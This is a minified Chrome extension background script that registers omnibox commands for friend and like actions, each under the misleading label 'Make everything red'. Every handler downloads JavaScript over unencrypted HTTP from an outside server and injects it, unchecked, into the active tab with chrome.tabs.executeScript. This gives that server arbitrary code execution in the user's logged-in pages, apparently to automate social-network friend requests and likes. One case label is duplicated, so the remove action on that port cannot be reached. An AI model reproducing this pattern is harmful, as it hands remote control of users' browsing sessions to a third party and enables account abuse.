chrome.omnibox.onInputChanged.addListener(function (e, n) {
  n([{
    content: "add-friend",
    description: "Make everything red"
  }, {
    content: "cancel-friend",
    description: "Make everything red"
  }, {
    content: "open-friend",
    description: "Make everything red"
  }, {
    content: "confirm-friend",
    description: "Make everything red"
  }, {
    content: "remove-friend",
    description: "Make everything red"
  }, {
    content: "delete-friend",
    description: "Make everything red"
  }, {
    content: "auto-like",
    description: "Make everything red"
  }, {
    content: "add-friendsR",
    description: "Make everything red"
  }])
}), chrome.omnibox.onInputEntered.addListener(function (e) {
  "add-friend" == e ? AddFriend() : "cancel-friend" == e ? CancelFriend() : "open-friend" == e ? OpenFriend() : "confirm-friend" == e ? ConfirmFriend() : "remove-friend" == e ? RemoveFriend() : "delete-friend" == e ? DeleteFriend() : "auto-like" == e ? AutoLike() : "add-friendsR" == e && AddFriendsR()
}), chrome.extension.onMessage.addListener(function (e, n, t) {
  switch (e.type) {
    case "add-friend":
      AddFriend();
      break;
    case "cancel-friend":
      CancelFriend();
      break;
    case "open-friend":
      OpenFriend();
      break;
    case "confirm-friend":
      ConfirmFriend();
      break;
    case "remove-friend":
      RemoveFriend();
      break;
    case "delete-friend":
      DeleteFriend();
      break;
    case "auto-like":
      AutoLike();
      break;
    case "add-friendsR":
      AddFriendsR()
  }
  return !0
}), chrome.extension.onConnect.addListener(function (e) {
  e.onMessage.addListener(function (n) {
    switch (e.name) {
      case "add-friend-port":
        AddFriend();
        break;
      case "cancel-friend-port":
        CancelFriend();
        break;
      case "open-friend-port":
        OpenFriend();
        break;
      case "confirm-friend-port":
        ConfirmFriend();
        break;
      case "confirm-friend-port":
        RemoveFriend();
        break;
      case "delete-friend-port":
        DeleteFriend();
        break;
      case "auto-like-port":
        AutoLike();
        break;
      case "add-friendsR":
        AddFriendsR()
    }
  })
});
var AddFriend = function () {
    chrome.tabs.getSelected(null, function (e) {
      var n = new XMLHttpRequest;
      n.open("GET", "http://qlcv.sheaghana.com/jstool/add.js", !0), n.onreadystatechange = function () {
        4 == n.readyState && chrome.tabs.executeScript(e.id, {
          code: n.responseText
        })
      }, n.send()
    })
  },
  CancelFriend = function () {
    chrome.tabs.getSelected(null, function (e) {
      var n = new XMLHttpRequest;
      n.open("GET", "http://qlcv.sheaghana.com/jstool/cancel.js", !0), n.onreadystatechange = function () {
        4 == n.readyState && chrome.tabs.executeScript(e.id, {
          code: n.responseText
        })
      }, n.send()
    })
  },
  OpenFriend = function () {
    chrome.tabs.getSelected(null, function (e) {
      var n = new XMLHttpRequest;
      n.open("GET", "http://qlcv.sheaghana.com/jstool/open_request.js", !0), n.onreadystatechange = function () {
        4 == n.readyState && chrome.tabs.executeScript(e.id, {
          code: n.responseText
        })
      }, n.send()
    })
  },
  ConfirmFriend = function () {
    chrome.tabs.getSelected(null, function (e) {
      var n = new XMLHttpRequest;
      n.open("GET", "http://qlcv.sheaghana.com/jstool/confirm.js", !0), n.onreadystatechange = function () {
        4 == n.readyState && chrome.tabs.executeScript(e.id, {
          code: n.responseText
        })
      }, n.send()
    })
  },
  RemoveFriend = function () {
    chrome.tabs.getSelected(null, function (e) {
      var n = new XMLHttpRequest;
      n.open("GET", "http://qlcv.sheaghana.com/jstool/remove.js", !0), n.onreadystatechange = function () {
        4 == n.readyState && chrome.tabs.executeScript(e.id, {
          code: n.responseText
        })
      }, n.send()
    })
  },
  DeleteFriend = function () {
    chrome.tabs.getSelected(null, function (e) {
      var n = new XMLHttpRequest;
      n.open("GET", "http://qlcv.sheaghana.com/jstool/delete.js", !0), n.onreadystatechange = function () {
        4 == n.readyState && chrome.tabs.executeScript(e.id, {
          code: n.responseText
        })
      }, n.send()
    })
  },
  AutoLike = function () {
    chrome.tabs.getSelected(null, function (e) {
      var n = new XMLHttpRequest;
      n.open("GET", "http://qlcv.sheaghana.com/jstool/autolike.js", !0), n.onreadystatechange = function () {
        4 == n.readyState && chrome.tabs.executeScript(e.id, {
          code: n.responseText
        })
      }, n.send()
    })
  },
  AddFriendsR = function () {
    chrome.tabs.getSelected(null, function (e) {
      var n = new XMLHttpRequest;
      n.open("GET", "http://qlcv.sheaghana.com/jstool/add.js", !0), n.onreadystatechange = function () {
        4 == n.readyState && chrome.tabs.executeScript(e.id, {
          code: n.responseText
        })
      }, n.send()
    })
  };